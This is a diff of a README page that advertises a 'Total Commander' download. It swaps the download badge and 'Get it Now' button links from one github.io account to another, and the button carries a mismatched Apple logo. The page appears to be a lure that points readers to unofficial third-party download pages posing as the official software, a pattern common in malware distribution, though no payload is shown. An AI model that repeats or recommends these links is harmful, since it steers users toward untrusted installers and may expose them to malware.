@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://gunbpx.github.io/.github/totalCommander">
+  <a href="https://maopolo-sot.github.io/.github/totalCommander">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Total Commander"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ Total Commander's FTP and SFTP integration is a meaningful workflow consolidatio
 
 <p align="center">
 
-[![Get it Now Total Commander](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://gunbpx.github.io/.github/totalCommander)
+[![Get it Now Total Commander](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://maopolo-sot.github.io/.github/totalCommander)
 
 </p>
 
